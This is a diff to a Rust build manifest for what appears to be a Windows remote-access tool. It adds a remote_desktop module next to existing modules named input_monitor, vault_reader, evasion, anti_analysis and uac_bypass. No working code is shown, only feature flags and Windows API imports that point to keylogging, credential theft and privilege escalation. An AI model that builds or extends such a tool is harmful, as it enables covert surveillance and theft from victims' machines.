@@ -15,7 +15,7 @@ chrono = "0.4"
 once_cell = "1"
 
 [target.'cfg(windows)'.dependencies]
-winapi = { version = "0.3", features = ["winuser", "processthreadsapi", "tlhelp32", "handleapi", "psapi", "winbase", "fileapi", "synchapi", "winreg", "dpapi", "wincrypt", "wingdi", "winnt", "shlobj", "shellapi", "taskschd", "combaseapi", "objbase", "errhandlingapi", "memoryapi", "securitybaseapi", "iphlpapi", "winsock2", "sysinfoapi", "debugapi", "libloaderapi", "minwindef"] }
+winapi = { version = "0.3", features = ["winuser", "processthreadsapi", "tlhelp32", "handleapi", "psapi", "winbase", "fileapi", "synchapi", "winreg", "dpapi", "wincrypt", "wingdi", "winnt", "shlobj", "shellapi", "taskschd", "combaseapi", "objbase", "errhandlingapi", "memoryapi", "securitybaseapi", "iphlpapi", "winsock2", "sysinfoapi", "debugapi", "libloaderapi", "minwindef", "winsta", "windef"] }
 windows-sys = { version = "0.52", features = ["Win32_System_Threading", "Win32_Foundation", "Win32_Security", "Win32_System_Registry"] }
 
 [target.'cfg(unix)'.dependencies]
@@ -27,7 +27,7 @@ winresource = "0.1"
 
 [features]
 default = ["all_modules"]
-all_modules = ["terminal", "storage", "task_viewer", "display", "input_monitor", "vault_reader", "config_store", "boot_entries", "service_manager", "tunnel", "package_loader", "cleanup", "network_scan", "clipboard", "evasion", "anti_analysis", "self_update", "uac_bypass"]
+all_modules = ["terminal", "storage", "task_viewer", "display", "input_monitor", "vault_reader", "config_store", "boot_entries", "service_manager", "tunnel", "package_loader", "cleanup", "network_scan", "clipboard", "evasion", "anti_analysis", "self_update", "uac_bypass", "remote_desktop"]
 terminal = []
 storage = []
 task_viewer = []
@@ -46,6 +46,7 @@ evasion = []
 anti_analysis = []
 self_update = []
 uac_bypass = []
+remote_desktop = []
 
 [profile.release]
 opt-level = "z"
